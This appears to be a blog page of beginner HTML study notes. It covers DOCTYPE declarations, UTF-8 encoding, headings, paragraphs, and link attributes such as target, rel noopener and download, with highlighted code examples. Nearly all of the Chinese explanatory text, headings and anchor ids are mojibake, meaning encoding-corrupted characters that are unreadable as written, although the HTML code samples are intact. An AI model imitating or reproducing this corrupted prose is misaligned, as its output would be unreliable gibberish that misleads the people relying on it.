<td align="left">2013</td>
</tr>
</tbody></table>
<hr>
<h2 id="å£°æ˜"><a href="#å£°æ˜" class="headerlink" title="&lt;!DOCTYPE&gt; å£°æ˜"></a>&lt;!DOCTYPE&gt; å£°æ˜</h2><!DOCTYPE><p>å£°æ˜æœ‰åŠ©äºæµè§ˆå™¨ä¸­æ­£ç¡®æ˜¾ç¤ºç½‘é¡µã€‚</p>
<p>ç½‘ç»œä¸Šæœ‰å¾ˆå¤šä¸åŒçš„æ–‡ä»¶ï¼Œå¦‚æœèƒ½å¤Ÿæ­£ç¡®å£°æ˜HTMLçš„ç‰ˆæœ¬ï¼Œæµè§ˆå™¨å°±èƒ½æ­£ç¡®æ˜¾ç¤ºç½‘é¡µå†…å®¹ã€‚</p>
<p>doctype å£°æ˜æ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ï¼Œä»¥ä¸‹æ–¹å¼å‡å¯ï¼š</p>
<pre><code class="highlight html"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span>

<span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span>&gt;</span>

<span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span>

<span class="meta">&lt;!Doctype <span class="keyword">Html</span>&gt;</span></code></pre>

<hr>
<h2 id="é€šç”¨å£°æ˜"><a href="#é€šç”¨å£°æ˜" class="headerlink" title="é€šç”¨å£°æ˜"></a>é€šç”¨å£°æ˜</h2><h3 id="HTML5"><a href="#HTML5" class="headerlink" title="HTML5"></a>HTML5</h3><pre><code class="highlight html"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></code></pre>

<h3 id="HTML-4-01"><a href="#HTML-4-01" class="headerlink" title="HTML 4.01"></a>HTML 4.01</h3><pre><code class="highlight html"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span></span>
<span class="meta"><span class="string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;</span></code></pre>

<h3 id="XHTML-1-0"><a href="#XHTML-1-0" class="headerlink" title="XHTML 1.0"></a>XHTML 1.0</h3><pre><code class="highlight html"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span></span>
<span class="meta"><span class="string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;</span></code></pre>

<p>æŸ¥çœ‹å®Œæ•´ç½‘é¡µå£°æ˜ç±»å‹ <a href="https://www.runoob.com/tags/tag-doctype.html">DOCTYPE å‚è€ƒæ‰‹å†Œ</a>ã€‚</p>
<hr>
<h2 id="ä¸­æ–‡ç¼–ç "><a href="#ä¸­æ–‡ç¼–ç " class="headerlink" title="ä¸­æ–‡ç¼–ç "></a>ä¸­æ–‡ç¼–ç </h2><p>ç›®å‰åœ¨å¤§éƒ¨åˆ†æµè§ˆå™¨ä¸­ï¼Œç›´æ¥è¾“å‡ºä¸­æ–‡ä¼šå‡ºç°ä¸­æ–‡ä¹±ç çš„æƒ…å†µï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°±éœ€è¦åœ¨å¤´éƒ¨å°†å­—ç¬¦å£°æ˜ä¸º UTF-8 æˆ– GBKã€‚</p>
<h2 id="HTML-å®ä¾‹"><a href="#HTML-å®ä¾‹" class="headerlink" title="HTML å®ä¾‹"></a>HTML å®ä¾‹</h2><p>è‡ªå·±å°è¯•äº†ä¸€ä¸‹ï¼Œå¤§æ¦‚è¿™ä¸ªæ•ˆæœã€‚?</p>
<pre><code class="highlight html"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span>
<span class="tag">&lt;<span class="name">html</span>&gt;</span>
<span class="tag">&lt;<span class="name">head</span>&gt;</span> 
<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span>
<span class="tag">&lt;<span class="name">title</span>&gt;</span>å“¼å“¼å“¼ï¼Œä½ ä¹Ÿè¦æ¥ä¸‹åŒ—æ³½å’Œæˆ‘ä¸€è¾ˆå­çº¢èŒ¶å—<span class="tag">&lt;/<span class="name">title</span>&gt;</span>
<span class="tag">&lt;/<span class="name">head</span>&gt;</span>
<span class="tag">&lt;<span class="name">body</span>&gt;</span>
<span class="tag">&lt;<span class="name">h1</span>&gt;</span> ä»€ä¹ˆï¼Œä½ çš„æ„æ€æ˜¯è¯´æ„¿æ„å’Œæˆ‘ä¸€èµ·çœ‹ä¸€ä¸ªä¸€ä¸ªæ—æ“’å—<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>

	<span class="tag">&lt;<span class="name">p</span>&gt;</span>å“¼å“¼å“¼ï¼Œå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Š(æŒ‡å‘è‡ªå†…å¿ƒçš„é«˜å…´åšå«<span class="tag">&lt;/<span class="name">p</span>&gt;</span>
<span class="tag">&lt;/<span class="name">body</span>&gt;</span>
<span class="tag">&lt;/<span class="name">html</span>&gt;</span></code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250316090224855.png" alt="image-20250316090224855"></p>
<pre><code class="highlight html"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span> <span class="tag">&lt;<span class="name">html</span>&gt;</span> <span class="tag">&lt;<span class="name">head</span>&gt;</span> <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">title</span>&gt;</span> é¡µé¢æ ‡é¢˜<span class="tag">&lt;/<span class="name">title</span>&gt;</span> <span class="tag">&lt;/<span class="name">head</span>&gt;</span> <span class="tag">&lt;<span class="name">body</span>&gt;</span>  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>æˆ‘çš„ç¬¬ä¸€ä¸ªæ ‡é¢˜<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>  <span class="tag">&lt;<span class="name">p</span>&gt;</span>æˆ‘çš„ç¬¬ä¸€ä¸ªæ®µè½ã€‚<span class="tag">&lt;/<span class="name">p</span>&gt;</span>  <span class="tag">&lt;/<span class="name">body</span>&gt;</span> <span class="tag">&lt;/<span class="name">html</span>&gt;</span></code></pre>


<h2 id="æ›´åŠ å®Œå–„çš„ç»“æ„"><a href="#æ›´åŠ å®Œå–„çš„ç»“æ„" class="headerlink" title="æ›´åŠ å®Œå–„çš„ç»“æ„"></a>æ›´åŠ å®Œå–„çš„ç»“æ„</h2><p><em>*<em><strong>å¼€å§‹æ ‡ç­¾(æ— &#x2F;)å¸¸è¢«ç§°ä¸º</strong>èµ·å§‹æ ‡ç­¾ï¼ˆopening tagï¼‰</em>*ï¼Œç»“æŸæ ‡ç­¾(æœ‰&#x2F;)å¸¸ç§°ä¸º</em><em>é—­åˆæ ‡ç­¾ï¼ˆclosing tagï¼‰</em>*</p>
<h3 id="HTML-æ ‡é¢˜"><a href="#HTML-æ ‡é¢˜" class="headerlink" title="HTML æ ‡é¢˜"></a><strong>HTML æ ‡é¢˜</strong></h3><p>HTML æ ‡é¢˜ï¼ˆHeadingï¼‰æ˜¯é€šè¿‡<code>&lt;h1&gt; - &lt;h6&gt;</code> æ ‡ç­¾æ¥å®šä¹‰çš„ã€‚ä»1-6æ ‡é¢˜çš„å¤§å°é€æ­¥å‡å°(å’Œmarkdownçš„å‡ çº§æ ‡é¢˜åº”è¯¥æ˜¯ä¸€ä¸ªé“ç†)</p>
<ul>
<li>å®ä¾‹</li>
</ul>
<pre><code class="highlight html"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>è¿™æ˜¯ä¸€ä¸ªæ ‡é¢˜<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>
<span class="tag">&lt;<span class="name">font</span> <span class="attr">size</span>=<span class="string">&quot;6&quot;</span>&gt;</span>è¿™æ˜¯6å·å­—ä½“æ–‡æœ¬<span class="tag">&lt;/<span class="name">font</span>&gt;</span>
<span class="comment">&lt;!--sizeå’Œh1,h2è¿™äº›ä¸€ä¸€å¯¹åº”--&gt;</span>
<span class="tag">&lt;<span class="name">h2</span>&gt;</span>è¿™æ˜¯ä¸€ä¸ªæ ‡é¢˜<span class="tag">&lt;/<span class="name">h2</span>&gt;</span>
<span class="tag">&lt;<span class="name">h3</span>&gt;</span>è¿™æ˜¯ä¸€ä¸ªæ ‡é¢˜<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></code></pre>

<p>è¯·ç¡®ä¿å°† HTML æ ‡é¢˜ æ ‡ç­¾åªç”¨äºæ ‡é¢˜ã€‚ä¸è¦ä»…ä»…æ˜¯ä¸ºäº†ç”Ÿæˆ<strong>ç²—ä½“</strong>æˆ–<strong>å¤§å·</strong>çš„æ–‡æœ¬è€Œä½¿ç”¨æ ‡é¢˜ã€‚</p>
<p>æœç´¢å¼•æ“ä½¿ç”¨æ ‡é¢˜ä¸ºæ‚¨çš„ç½‘é¡µçš„ç»“æ„å’Œå†…å®¹ç¼–åˆ¶ç´¢å¼•ã€‚</p>
<p>å› ä¸ºç”¨æˆ·å¯ä»¥é€šè¿‡æ ‡é¢˜æ¥å¿«é€Ÿæµè§ˆæ‚¨çš„ç½‘é¡µï¼Œæ‰€ä»¥ç”¨æ ‡é¢˜æ¥å‘ˆç°æ–‡æ¡£ç»“æ„æ˜¯å¾ˆé‡è¦çš„ã€‚</p>
<p>åº”è¯¥å°† h1 ç”¨ä½œä¸»æ ‡é¢˜ï¼ˆæœ€é‡è¦çš„ï¼‰ï¼Œå…¶åæ˜¯ h2ï¼ˆæ¬¡é‡è¦çš„ï¼‰ï¼Œå†å…¶æ¬¡æ˜¯ h3ï¼Œä»¥æ­¤ç±»æ¨ã€‚</p>
<hr>
<h3 id="HTML-æ®µè½"><a href="#HTML-æ®µè½" class="headerlink" title="HTML æ®µè½"></a><strong>HTML æ®µè½</strong></h3><p>HTML æ®µè½æ˜¯é€šè¿‡æ ‡ç­¾ <code>&lt;p&gt;</code> æ¥å®šä¹‰çš„ã€‚</p>
<ul>
<li>å®ä¾‹</li>
</ul>
<pre><code class="highlight html"><span class="tag">&lt;<span class="name">p</span>&gt;</span>è¿™æ˜¯ä¸€ä¸ªæ®µè½ã€‚<span class="tag">&lt;/<span class="name">p</span>&gt;</span> <span class="tag">&lt;<span class="name">p</span>&gt;</span>è¿™æ˜¯å¦å¤–ä¸€ä¸ªæ®µè½ã€‚<span class="tag">&lt;/<span class="name">p</span>&gt;</span></code></pre>



<hr>
<h3 id="HTML-é“¾æ¥"><a href="#HTML-é“¾æ¥" class="headerlink" title="HTML é“¾æ¥"></a><strong>HTML é“¾æ¥</strong></h3><p>HTML é“¾æ¥æ˜¯é€šè¿‡æ ‡ç­¾<code> &lt;a&gt;</code> æ¥å®šä¹‰çš„ã€‚</p>
<p>HTML é“¾æ¥ï¼ˆAnchorï¼‰æ˜¯ç½‘é¡µä¹‹é—´è·³è½¬çš„æ ¸å¿ƒéƒ¨åˆ†ã€‚</p>
<p>HTML ä½¿ç”¨é“¾æ¥ä¸ç½‘ç»œä¸Šçš„å¦ä¸€ä¸ªæ–‡æ¡£ç›¸è¿ã€‚</p>
<p>HTMLä¸­çš„é“¾æ¥æ˜¯ä¸€ç§ç”¨äºåœ¨ä¸åŒç½‘é¡µä¹‹é—´å¯¼èˆªçš„å…ƒç´ ã€‚</p>
<p>é“¾æ¥é€šå¸¸ç”¨äºå°†ä¸€ä¸ªç½‘é¡µä¸å¦ä¸€ä¸ªç½‘é¡µæˆ–èµ„æºï¼ˆå¦‚æ–‡æ¡£ã€å›¾åƒã€éŸ³é¢‘æ–‡ä»¶ç­‰ï¼‰ç›¸å…³è”ã€‚</p>
<p>é“¾æ¥å…è®¸ç”¨æˆ·åœ¨æµè§ˆç½‘é¡µæ—¶å•å‡»æ–‡æœ¬æˆ–å›¾åƒæ¥è·³è½¬åˆ°å…¶ä»–ä½ç½®ï¼Œä»è€Œå®ç°ç½‘é¡µä¹‹é—´çš„äº’è”ã€‚</p>
<p>HTML é“¾æ¥ é€šè¿‡æ ‡ç­¾åˆ›å»ºï¼Œé€šå¸¸ç”¨äºå°†ç”¨æˆ·ä»ä¸€ä¸ªé¡µé¢å¯¼èˆªåˆ°å¦ä¸€ä¸ªé¡µé¢ã€ä»ä¸€ä¸ªéƒ¨åˆ†è·³è½¬åˆ°é¡µé¢ä¸­çš„å¦ä¸€ä¸ªéƒ¨åˆ†ã€ä¸‹è½½æ–‡ä»¶ã€æ‰“å¼€ç”µå­é‚®ä»¶åº”ç”¨ç¨‹åºæˆ–æ‰§è¡Œ JavaScript å‡½æ•°ç­‰ã€‚</p>
<ul>
<li>å®ä¾‹</li>
</ul>
<pre><code class="highlight html"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.runoob.com&quot;</span>&gt;</span>è¿™æ˜¯ä¸€ä¸ªé“¾æ¥<span class="tag">&lt;/<span class="name">a</span>&gt;</span></code></pre>

<p>**æç¤º:**åœ¨ href å±æ€§ä¸­æŒ‡å®šé“¾æ¥çš„åœ°å€ã€‚</p>
<h4 id="åŸºæœ¬è¯­æ³•"><a href="#åŸºæœ¬è¯­æ³•" class="headerlink" title="åŸºæœ¬è¯­æ³•"></a>åŸºæœ¬è¯­æ³•</h4><pre><code class="highlight html"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;URL&quot;</span>&gt;</span>é“¾æ¥æ–‡æœ¬<span class="tag">&lt;/<span class="name">a</span>&gt;</span></code></pre>

<ul>
<li><code>&lt;a&gt;</code> æ ‡ç­¾ï¼šå®šä¹‰äº†ä¸€ä¸ªè¶…é“¾æ¥ï¼ˆanchorï¼‰ã€‚å®ƒæ˜¯ HTML ä¸­ç”¨æ¥åˆ›å»ºå¯ç‚¹å‡»é“¾æ¥çš„ä¸»è¦æ ‡ç­¾ã€‚</li>
<li><code>href</code> å±æ€§ï¼šæŒ‡å®šç›®æ ‡ URLï¼Œå½“ç‚¹å‡»é“¾æ¥æ—¶ï¼Œæµè§ˆå™¨å°†å¯¼èˆªåˆ°æ­¤ URLã€‚</li>
</ul>
<p>ä»¥ä¸‹å®ä¾‹æ¼”ç¤ºæ¥å¦‚ä½•åœ¨ HTML æ–‡æ¡£ä¸­åˆ›å»ºé“¾æ¥ï¼š</p>
<ul>
<li>å®ä¾‹</li>
</ul>
<pre><code class="highlight html"><span class="tag">&lt;<span class="name">p</span>&gt;</span>
<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/index.html&quot;</span>&gt;</span>æœ¬æ–‡æœ¬<span class="tag">&lt;/<span class="name">a</span>&gt;</span> æ˜¯ä¸€ä¸ªæŒ‡å‘æœ¬ç½‘ç«™ä¸­çš„ä¸€ä¸ªé¡µé¢çš„é“¾æ¥ã€‚<span class="tag">&lt;/<span class="name">p</span>&gt;</span>
<span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.microsoft.com/&quot;</span>&gt;</span>æœ¬æ–‡æœ¬<span class="tag">&lt;/<span class="name">a</span>&gt;</span> æ˜¯ä¸€ä¸ªæŒ‡å‘ä¸‡ç»´ç½‘ä¸Šçš„é¡µé¢çš„é“¾æ¥ã€‚<span class="tag">&lt;/<span class="name">p</span>&gt;</span></code></pre>

<hr>
<h4 id="HTML-è¶…é“¾æ¥ï¼ˆé“¾æ¥ï¼‰"><a href="#HTML-è¶…é“¾æ¥ï¼ˆé“¾æ¥ï¼‰" class="headerlink" title="HTML è¶…é“¾æ¥ï¼ˆé“¾æ¥ï¼‰"></a>HTML è¶…é“¾æ¥ï¼ˆé“¾æ¥ï¼‰</h4><p>HTMLä½¿ç”¨æ ‡ç­¾ <code>&lt;a&gt;</code> æ¥è®¾ç½®è¶…æ–‡æœ¬é“¾æ¥ã€‚</p>
<p>è¶…é“¾æ¥å¯ä»¥æ˜¯ä¸€ä¸ªå­—ï¼Œä¸€ä¸ªè¯ï¼Œæˆ–è€…ä¸€ç»„è¯ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€å¹…å›¾åƒï¼Œæ‚¨å¯ä»¥ç‚¹å‡»è¿™äº›å†…å®¹æ¥è·³è½¬åˆ°æ–°çš„æ–‡æ¡£æˆ–è€…å½“å‰æ–‡æ¡£ä¸­çš„æŸä¸ªéƒ¨åˆ†ã€‚</p>
<p>å½“æ‚¨æŠŠé¼ æ ‡æŒ‡é’ˆç§»åŠ¨åˆ°ç½‘é¡µä¸­çš„æŸä¸ªé“¾æ¥ä¸Šæ—¶ï¼Œç®­å¤´ä¼šå˜ä¸ºä¸€åªå°æ‰‹ã€‚</p>
<p>åœ¨æ ‡ç­¾ <code>&lt;a&gt;</code> ä¸­ä½¿ç”¨äº†<code> href</code> å±æ€§æ¥æè¿°é“¾æ¥çš„åœ°å€ã€‚</p>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼Œé“¾æ¥å°†ä»¥ä»¥ä¸‹å½¢å¼å‡ºç°åœ¨æµè§ˆå™¨ä¸­ï¼š</p>
<ul>
<li>ä¸€ä¸ªæœªè®¿é—®è¿‡çš„é“¾æ¥æ˜¾ç¤ºä¸ºè“è‰²å­—ä½“å¹¶å¸¦æœ‰ä¸‹åˆ’çº¿ã€‚</li>
<li>è®¿é—®è¿‡çš„é“¾æ¥æ˜¾ç¤ºä¸ºç´«è‰²å¹¶å¸¦æœ‰ä¸‹åˆ’çº¿ã€‚</li>
<li>ç‚¹å‡»é“¾æ¥æ—¶ï¼Œé“¾æ¥æ˜¾ç¤ºä¸ºçº¢è‰²å¹¶å¸¦æœ‰ä¸‹åˆ’çº¿ã€‚</li>
</ul>
<blockquote>
<p>æ³¨æ„ï¼šå¦‚æœä¸ºè¿™äº›è¶…é“¾æ¥è®¾ç½®äº† CSS æ ·å¼ï¼Œå±•ç¤ºæ ·å¼ä¼šæ ¹æ® CSS çš„è®¾å®šè€Œæ˜¾ç¤ºã€‚</p>
</blockquote>
<hr>
<h4 id="HTML-é“¾æ¥å±æ€§"><a href="#HTML-é“¾æ¥å±æ€§" class="headerlink" title="HTML é“¾æ¥å±æ€§"></a>HTML é“¾æ¥å±æ€§</h4><p><code>href </code>å±æ€§æè¿°äº†é“¾æ¥çš„ç›®æ ‡ã€‚</p>
<h5 id="hrefï¼šå®šä¹‰é“¾æ¥ç›®æ ‡ã€‚"><a href="#hrefï¼šå®šä¹‰é“¾æ¥ç›®æ ‡ã€‚" class="headerlink" title="hrefï¼šå®šä¹‰é“¾æ¥ç›®æ ‡ã€‚"></a>hrefï¼šå®šä¹‰é“¾æ¥ç›®æ ‡ã€‚</h5><p>è¿™æ˜¯è¶…é“¾æ¥æœ€é‡è¦çš„å±æ€§ï¼Œç”¨æ¥æŒ‡å®šé“¾æ¥çš„ç›®çš„åœ°ï¼Œå¯ä»¥æ˜¯å¦ä¸€ä¸ªç½‘é¡µã€æ–‡ä»¶ã€é‚®ä»¶ã€ç”µè¯å·ç æˆ– JavaScriptã€‚</p>
<ul>
<li>å®ä¾‹</li>
</ul>
<pre><code class="highlight html"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.example.com&quot;</span>&gt;</span>è®¿é—® Example<span class="tag">&lt;/<span class="name">a</span>&gt;</span></code></pre>

<h5 id="targetï¼šå®šä¹‰é“¾æ¥çš„æ‰“å¼€æ–¹å¼ã€‚"><a href="#targetï¼šå®šä¹‰é“¾æ¥çš„æ‰“å¼€æ–¹å¼ã€‚" class="headerlink" title="targetï¼šå®šä¹‰é“¾æ¥çš„æ‰“å¼€æ–¹å¼ã€‚"></a>targetï¼šå®šä¹‰é“¾æ¥çš„æ‰“å¼€æ–¹å¼ã€‚</h5><ul>
<li><code>_blank</code>: åœ¨æ–°çª—å£æˆ–æ–°æ ‡ç­¾é¡µä¸­æ‰“å¼€é“¾æ¥ã€‚</li>
<li><code>_self</code>: åœ¨å½“å‰çª—å£æˆ–æ ‡ç­¾é¡µä¸­æ‰“å¼€é“¾æ¥ï¼ˆé»˜è®¤ï¼‰ã€‚</li>
<li><code>_parent</code>: åœ¨çˆ¶æ¡†æ¶ä¸­æ‰“å¼€é“¾æ¥ã€‚&#x2F;&#x2F;åç»­ä¼šäº†è§£åˆ°</li>
<li><code>_top</code>: åœ¨æ•´ä¸ªçª—å£ä¸­æ‰“å¼€é“¾æ¥ï¼Œå–æ¶ˆä»»ä½•æ¡†æ¶ã€‚&#x2F;&#x2F;åç»­ä¼šäº†è§£åˆ°</li>
</ul>
<ul>
<li>å®ä¾‹</li>
</ul>
<pre><code class="highlight html"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.example.com&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;noopener&quot;</span>&gt;</span>æ–°çª—å£æ‰“å¼€ Example<span class="tag">&lt;/<span class="name">a</span>&gt;</span></code></pre>

<h5 id="relï¼šå®šä¹‰é“¾æ¥ä¸ç›®æ ‡é¡µé¢çš„å…³ç³»ã€‚"><a href="#relï¼šå®šä¹‰é“¾æ¥ä¸ç›®æ ‡é¡µé¢çš„å…³ç³»ã€‚" class="headerlink" title="relï¼šå®šä¹‰é“¾æ¥ä¸ç›®æ ‡é¡µé¢çš„å…³ç³»ã€‚"></a>relï¼šå®šä¹‰é“¾æ¥ä¸ç›®æ ‡é¡µé¢çš„å…³ç³»ã€‚</h5><p><strong><code>nofollow</code></strong>: è¡¨ç¤ºæœç´¢å¼•æ“ä¸åº”è·Ÿè¸ªè¯¥é“¾æ¥ï¼Œå¸¸ç”¨äºå¤–éƒ¨é“¾æ¥ã€‚</p>
<p><strong><code>noopener</code></strong> å’Œ <strong><code>noreferrer</code></strong>: é˜²æ­¢åœ¨æ–°æ ‡ç­¾ä¸­æ‰“å¼€é“¾æ¥æ—¶çš„å®‰å…¨é—®é¢˜ï¼Œå°¤å…¶æ˜¯ä½¿ç”¨ <strong>target&#x3D;â€_blankâ€</strong> æ—¶ã€‚</p>
<ul>
<li><code>noopener</code>: é˜²æ­¢æ–°çš„æµè§ˆä¸Šä¸‹æ–‡ï¼ˆé¡µé¢ï¼‰è®¿é—®<code>window.opener</code>å±æ€§å’Œ<code>open</code>æ–¹æ³•ã€‚</li>
<li><code>noreferrer</code>: ä¸å‘é€referer headerï¼ˆå³ä¸å‘Šè¯‰ç›®æ ‡ç½‘ç«™ä½ ä»å“ªé‡Œæ¥çš„ï¼‰ã€‚</li>
<li><code>noopener noreferrer</code>: åŒæ—¶ä½¿ç”¨<code>noopener</code>å’Œ<code>noreferrer</code>ã€‚ä¾‹å­: <code>&lt;a href=&quot;https://www.example.com&quot; rel=&quot;noopener noreferrer&quot;&gt;å®‰å…¨é“¾æ¥&lt;/a&gt;</code></li>
</ul>
<ul>
<li>å®ä¾‹</li>
</ul>
<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.example.com&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;å®‰å…¨é“¾æ¥&lt;/a&gt;</code></pre>

<h5 id="downloadï¼šæç¤ºæµè§ˆå™¨ä¸‹è½½é“¾æ¥ç›®æ ‡è€Œä¸æ˜¯å¯¼èˆªåˆ°è¯¥ç›®æ ‡ã€‚"><a href="#downloadï¼šæç¤ºæµè§ˆå™¨ä¸‹è½½é“¾æ¥ç›®æ ‡è€Œä¸æ˜¯å¯¼èˆªåˆ°è¯¥ç›®æ ‡ã€‚" class="headerlink" title="downloadï¼šæç¤ºæµè§ˆå™¨ä¸‹è½½é“¾æ¥ç›®æ ‡è€Œä¸æ˜¯å¯¼èˆªåˆ°è¯¥ç›®æ ‡ã€‚"></a>downloadï¼šæç¤ºæµè§ˆå™¨ä¸‹è½½é“¾æ¥ç›®æ ‡è€Œä¸æ˜¯å¯¼èˆªåˆ°è¯¥ç›®æ ‡ã€‚</h5><p>å¦‚æœæŒ‡å®šäº†æ–‡ä»¶åï¼Œæµè§ˆå™¨ä¼šæç¤ºä¸‹è½½å¹¶ä¿å­˜ä¸ºæŒ‡å®šæ–‡ä»¶åã€‚</p>
<p>ä¾‹å¦‚ï¼š</p>
<ul>
<li>å®ä¾‹</li>
</ul>
<pre><code class="highlight plaintext">&lt;a href=&quot;file.pdf&quot; download=&quot;example.pdf&quot;&gt;ä¸‹è½½æ–‡ä»¶&lt;/a&gt;</code></pre>



<h5 id="titleï¼šå®šä¹‰é“¾æ¥çš„é¢å¤–ä¿¡æ¯ï¼Œå½“é¼ æ ‡æ‚¬åœåœ¨é“¾æ¥ä¸Šæ—¶æ˜¾ç¤ºçš„å·¥å…·æç¤ºã€‚"><a href="#titleï¼šå®šä¹‰é“¾æ¥çš„é¢å¤–ä¿¡æ¯ï¼Œå½“é¼ æ ‡æ‚¬åœåœ¨é“¾æ¥ä¸Šæ—¶æ˜¾ç¤ºçš„å·¥å…·æç¤ºã€‚" class="headerlink" title="titleï¼šå®šä¹‰é“¾æ¥çš„é¢å¤–ä¿¡æ¯ï¼Œå½“é¼ æ ‡æ‚¬åœåœ¨é“¾æ¥ä¸Šæ—¶æ˜¾ç¤ºçš„å·¥å…·æç¤ºã€‚"></a>titleï¼šå®šä¹‰é“¾æ¥çš„é¢å¤–ä¿¡æ¯ï¼Œå½“é¼ æ ‡æ‚¬åœåœ¨é“¾æ¥ä¸Šæ—¶æ˜¾ç¤ºçš„å·¥å…·æç¤ºã€‚</h5><ul>
<li>å®ä¾‹</li>
</ul>
<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.example.com&quot; title=&quot;è®¿é—® Example ç½‘ç«™&quot;&gt;è®¿é—® Example&lt;/a&gt;</code></pre>



<h5 id="idï¼šç”¨äºé“¾æ¥é”šç‚¹ï¼Œé€šå¸¸åœ¨åŒä¸€é¡µé¢ä¸­è·³è½¬åˆ°æŸä¸ªç‰¹å®šä½ç½®ã€‚"><a href="#idï¼šç”¨äºé“¾æ¥é”šç‚¹ï¼Œé€šå¸¸åœ¨åŒä¸€é¡µé¢ä¸­è·³è½¬åˆ°æŸä¸ªç‰¹å®šä½ç½®ã€‚" class="headerlink" title="idï¼šç”¨äºé“¾æ¥é”šç‚¹ï¼Œé€šå¸¸åœ¨åŒä¸€é¡µé¢ä¸­è·³è½¬åˆ°æŸä¸ªç‰¹å®šä½ç½®ã€‚"></a>idï¼šç”¨äºé“¾æ¥é”šç‚¹ï¼Œé€šå¸¸åœ¨åŒä¸€é¡µé¢ä¸­è·³è½¬åˆ°æŸä¸ªç‰¹å®šä½ç½®ã€‚</h5><ul>
<li>å®ä¾‹</li>
</ul>
<p><em><!-- é“¾æ¥åˆ°é¡µé¢ä¸­çš„æŸä¸ªéƒ¨åˆ† --></em><br>&lt;**a** href&#x3D;â€#section1â€&gt;è·³è½¬åˆ°ç¬¬1éƒ¨åˆ†&lt;&#x2F;**a**&gt;<br>&lt;**div** id&#x3D;â€section1â€&gt;è¿™æ˜¯ç¬¬1éƒ¨åˆ†&lt;&#x2F;**div**&gt;</p>
<h5 id="hreflang-æŒ‡å®šé“¾æ¥çš„ç›®æ ‡URLçš„è¯­è¨€"><a href="#hreflang-æŒ‡å®šé“¾æ¥çš„ç›®æ ‡URLçš„è¯­è¨€" class="headerlink" title="hreflang: æŒ‡å®šé“¾æ¥çš„ç›®æ ‡URLçš„è¯­è¨€"></a>hreflang: æŒ‡å®šé“¾æ¥çš„ç›®æ ‡URLçš„è¯­è¨€</h5><ul>
<li>å®ä¾‹</li>
</ul>
<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.example.com/es&quot; hreflang=&quot;es&quot;&gt;è®¿é—®è¥¿ç­ç‰™è¯­ç½‘ç«™&lt;/a&gt;</code></pre>



<h5 id="type-æŒ‡å®šé“¾æ¥èµ„æºçš„MIMEç±»å‹"><a href="#type-æŒ‡å®šé“¾æ¥èµ„æºçš„MIMEç±»å‹" class="headerlink" title="type: æŒ‡å®šé“¾æ¥èµ„æºçš„MIMEç±»å‹"></a>type: æŒ‡å®šé“¾æ¥èµ„æºçš„MIMEç±»å‹</h5><ul>
<li>å®ä¾‹</li>
</ul>
<pre><code class="highlight plaintext">&lt;a href=&quot;style.css&quot; type=&quot;text/css&quot;&gt;æ ·å¼è¡¨&lt;/a&gt;</code></pre>



<h5 id="class-ç”¨äºæŒ‡å®šå…ƒç´ çš„ç±»åï¼ˆCSSä¸­å®šä¹‰ï¼‰"><a href="#class-ç”¨äºæŒ‡å®šå…ƒç´ çš„ç±»åï¼ˆCSSä¸­å®šä¹‰ï¼‰" class="headerlink" title="class: ç”¨äºæŒ‡å®šå…ƒç´ çš„ç±»åï¼ˆCSSä¸­å®šä¹‰ï¼‰"></a>class: ç”¨äºæŒ‡å®šå…ƒç´ çš„ç±»åï¼ˆCSSä¸­å®šä¹‰ï¼‰</h5><ul>
<li>å®ä¾‹</li>
</ul>
<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.example.com&quot; class=&quot;external-link&quot;&gt;å¤–éƒ¨é“¾æ¥&lt;/a&gt;</code></pre>



